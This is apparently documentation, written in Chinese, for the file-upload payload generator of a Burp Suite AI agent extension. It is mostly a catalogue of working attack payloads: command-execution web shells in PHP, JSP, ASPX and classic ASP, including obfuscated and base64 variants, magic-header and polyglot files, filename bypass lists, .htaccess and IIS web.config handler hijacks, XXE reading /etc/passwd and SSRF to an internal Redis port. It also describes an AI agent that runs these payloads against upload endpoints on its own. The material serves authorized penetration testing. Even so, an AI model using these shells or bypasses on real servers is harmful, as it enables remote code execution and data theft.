# File Upload Payload Documentation

本文档详细说明了 BurpAI Agent 中的文件上传 payload 生成能力。

## 概述

BurpAI Agent 包含一个强大的 `FileUploadPayloadGenerator`，可以生成 **60+ 种专业 payload**，用于测试任意文件上传漏洞。这些 payload 涵盖了 Web Shell 上传、多种绕过技术、配置文件注入等多个攻击向量。

## Payload 类别

### 1. Web Shells (PHP)

#### 基础 Web Shell
```php
<?php system($_GET['cmd']); ?>
```

#### 混淆 Web Shell
使用变量函数和字符串连接技术绕过简单的过滤器：
```php
$='_';$_[+$_]='';
($_=$_[+$_]|$[+$_]).($_[+$_]|$[+$_]).($_[+$_]|$[+$_]);
$_='';$_[+$_]='';
$_=$_[+$_].$_[+$_].$_[+$_].($_[+$_]|$[+$_]).$_[+$_];
<?php @$_($_[+$_]($_[+$_])); ?>
```

#### System() 函数 Shell
```php
<?php if(isset($_GET['c'])) { system($_GET['c']); } ?>
```

#### Eval() 函数 Shell
```php
<?php if(isset($_GET['c'])) { eval($_GET['c']); } ?>
```

#### Base64 编码 Shell
```php
<?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')); ?>
```

#### 变量函数 Shell
```php
<?php $a='sys'.'tem';$a($_GET['c']); ?>
```

### 2. Web Shells (JSP)

#### 标准 JSP Web Shell
```jsp
<%@ page import='java.io.*' %>
<%
  String cmd = request.getParameter('c');
  if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while((line = br.readLine()) != null) {
      out.println(line);
    }
  }
%>
```

#### System Shell
```jsp
<%@ page import='java.io.*' %>
<% Runtime.getRuntime().exec(request.getParameter('c')); %>
```

### 3. Web Shells (ASPX)

#### 标准 ASPX Web Shell
```asp
<%@ Page Language='C#' %>
<%@ Import Namespace='System.Diagnostics' %>
<script runat='server'>
  void Page_Load(object sender, EventArgs e) {
    string cmd = Request.QueryString['c'];
    if (!string.IsNullOrEmpty(cmd)) {
      Process.Start(new ProcessStartInfo {
        FileName = 'cmd.exe',
        Arguments = '/c ' + cmd,
        UseShellExecute = false,
        RedirectStandardOutput = true
      });
    }
  }
</script>
```

### 4. Web Shells (ASP Classic)

```asp
<%
  Dim cmd
  cmd = Request.QueryString('c')
  If cmd <> '' Then
    Response.Write Server.CreateObject('WScript.Shell').Exec(cmd).StdOut.ReadAll
  End If
%>
```

### 5. Magic Header 注入

#### GIF89a + PHP
```php
GIF89a<?php system($_GET['cmd']); ?>
```

#### JPEG + PHP
```php
ÿØÿà<?php system($_GET['cmd']); ?>
```

#### PNG + PHP
```php
‰PNG
<?php system($_GET['cmd']); ?>
```

### 6. Polyglot 文件

#### GIF + PHP Polyglot
```php
GIF89a<script language='php'>system($_GET['cmd']);</script>
```

#### JPEG + PHP Polyglot
```php
ÿØÿà<?php system($_GET['cmd']); ?>
```

### 7. 双扩展名绕过

生成的文件名变体包括：
- `shell.php.jpg`
- `shell.php5.jpg`
- `shell.php7.jpg`
- `shell.phtml.jpg`
- `shell.pht.jpg`
- `shell.phps.jpg`
- `shell.inc.jpg`
- `file.jpg.php`
- `file.php.jpg.php`

对于以下组合：
- 扩展名: php, php5, php7, phtml, pht, phps, inc
- 图片扩展名: jpg, jpeg, png, gif, bmp

### 8. Null 字节注入

- `shell.php%00.jpg` (URL 编码)
- `shell.php\x00.jpg` (原始 null 字节)
- `upload.php%00.png`

### 9. .htaccess 攻击

#### 执行 .jpg 为 PHP
```
<FilesMatch "\.jpg$">
SetHandler application/x-httpd-php
</FilesMatch>
```

#### 执行 .gif 为 PHP
```
AddType application/x-httpd-php .gif
```

#### PHP 源码泄露
```
RemoveHandler .php
```

#### 启用目录列表
```
Options +Indexes
```

#### 启用 SSI
```
AddHandler server-parsed .html
```

### 10. Config 文件注入

#### IIS web.config (执行 .jpg 为 ASP)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Execute">
      <add name="ASP" path="*.jpg" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="None" />
    </handlers>
  </system.webServer>
</configuration>
```

#### IIS web.config (执行 .jpg 为 PHP)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="PHP_via_FastCGI" path="*.jpg" verb="*" modules="FastCgiModule" scriptProcessor="C:\php\php-cgi.exe" resourceType="Unspecified" />
    </handlers>
  </system.webServer>
</configuration>
```

#### PHP-FPM .user.ini
```
auto_prepend_file = uploaded_shell.php
```

### 11. MIME 类型欺骗

生成具有以下 MIME 类型的 PHP 代码文件：
- `image/jpeg`
- `image/png`
- `application/octet-stream`
- `text/plain`
- `application/x-shockwave-flash`

### 12. 特殊字符绕过

生成的文件名变体包括：
- `shell.pHp` (大小写混合)
- `file.PHP`
- `cmd.Php5`
- `upload.php.` (尾部点)
- `file.php::$DATA`
- `shell.php%20` (空格)
- `upload.php%2ejpg` (点编码)
- `file.php%00` (null 字节)
- `shell.asp.jpg`
- `file...php` (多个点)
- `shell.php/` (尾部斜杠)

### 13. Unicode 绕过

- `shell\u0000.php`
- `file\u202e.php` (右到左字符)
- `shell\u202d.php` (左到右字符)
- `upload\uff0e.php` (全角点)
- `shell\uff0ejpg`

### 14. 大文件 DoS

生成 10MB 随机数据用于测试 DoS 漏洞。

### 15. XXE via XML Upload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

### 16. SSRF via Upload

SVG 文件包含内部服务请求：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:6379/INFO" >]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

### 17. Archive Exploitation

#### ZIP 文件
```
PK\x03\x04[恶意 PHP 代码]
```

#### TAR 文件
```
[恶意 PHP 代码]
```

#### RAR 文件
```
Rar!\x1A\x07\x00[恶意 PHP 代码]
```

## 使用方法

在 Repeater 中选择一个文件上传请求，右键点击并选择：
- `BurpAI Agent` → `File Upload Analysis`

AI Agent 将：
1. 分析上传端点的行为
2. 系统地测试不同类型的 payload
3. 检测绕过技术的有效性
4. 识别成功的 Web Shell 上传
5. 提供详细的分析报告

## 测试顺序

AI Agent 按照以下优先级测试 payload：

1. **基础 Web Shells** - 标准的文件上传测试
2. **Magic Header 注入** - 尝试绕过文件头验证
3. **Polyglot 文件** - 测试文件类型识别绕过
4. **双扩展名** - 经典的文件扩展绕过
5. **Null 字节注入** - 针对 C/C++ 后端的绕过
6. **MIME 欺骗** - 测试仅检查 MIME 的应用
7. **特殊字符** - 各种字符绕过技术
8. **Unicode 绕过** - 针对特定编码的绕过
9. **.htaccess 攻击** - Apache 配置劫持
10. **Config 文件攻击** - IIS/PHP-FPM 配置劫持
11. **XXE via XML** - XML 解析器漏洞
12. **SSRF via Upload** - 内部服务发现
13. **Archive Exploits** - 归档处理漏洞
14. **大文件 DoS** - 拒绝服务测试

## 安全提示

⚠️ **重要安全警告：**

1. 本工具仅用于**授权的安全测试**
2. 使用本工具进行未授权测试是**非法的**
3. 测试前必须获得书面授权
4. 测试过程中发现的安全问题应立即报告给目标组织
5. 不要在生产环境中测试 Web Shell 是否执行
6. 确保测试环境与生产环境隔离

## 绕过原理

### Magic Headers

某些应用只检查文件的前几个字节（文件头/Magic Bytes），而不验证实际内容。通过在真实文件头后添加恶意代码，可以绕过这种验证。

### 双扩展名

配置错误的 Web 服务器可能只检查最后一个扩展名（`.jpg`），但 PHP 模块可能识别 `.php` 并执行代码。

### Null 字节

在 C/C++ 实现中，字符串以 null 字节（`\0`）终止。如果文件名检查使用 `strcmp()`，`file.php%00.jpg` 会被视为 `file.php`，但某些库可能传递完整文件名。

### MIME 类型欺骗

如果应用只检查 `Content-Type` 头部而不验证实际内容，可以上传任意文件。

### .htaccess 攻击

上传 `.htaccess` 文件可以覆盖目录级别的 Apache 配置，改变文件处理方式。

## 检测方法

AI Agent 通过以下方式检测成功的文件上传：

1. **上传成功** - HTTP 状态码 200/201
2. **文件可访问** - 尝试访问上传的文件
3. **代码执行** - 通过命令执行测试（如 `?cmd=ls`）
4. **响应差异** - 比较正常响应和攻击响应
5. **错误消息** - 检测 PHP/JSP/ASPX 错误消息

## 自定义 Payload

可以通过 `Custom Prompt` 功能要求 AI 生成特定类型的 payload：

```
Generate a PHP web shell that uses the passthru() function
instead of system(), and obfuscate it using base64 encoding.
```

## 参考资料

- OWASP File Upload Testing
- Web Application Security (WASC)
- Common Weakness Enumeration (CWE-434)
- PHP File Upload Security Guide
- IIS Configuration Security

## 贡献

发现新的绕过技术或 payload 变体？欢迎提交 Pull Request！
